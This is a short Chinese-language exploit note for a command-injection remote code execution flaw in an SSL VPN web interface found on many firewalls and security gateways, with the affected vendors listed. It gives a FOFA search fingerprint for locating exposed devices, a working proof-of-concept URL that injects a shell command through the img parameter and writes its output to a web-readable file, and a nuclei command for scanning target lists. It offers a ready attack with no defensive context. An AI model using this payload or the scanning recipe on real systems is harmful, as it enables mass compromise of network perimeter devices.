# 特征

fofa

```
body="/webui/images/default/default/alert_close.jpg"
```



# 影响产品

受影响产品如下（部分已修复）
H3C-下一代防火墙
安恒信息-明御安全网关
MAiPU-安全网关
D_Link-下一代防火墙
HUAWEI-公司产品
迈普通信技术股份有限公司安全网关
博达通信-下一代防火墙
任天行网络安全管理系统\安全审计系统
安博通应用网关
烽火网络安全审计
瑞斯康达科技发展股份有限公司安全路由器
任子行网络安全审计系统
绿盟安全审计系统
深圳市鑫塔科技有限公司第二代防火墙



# POC

```
/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt
```

```
访问  /sslvpn/ceshi.txt
```



# nuclei

```
nuclei -l .\1.txt -t .\ssl_vpn_rce.yaml -o 1.html
```

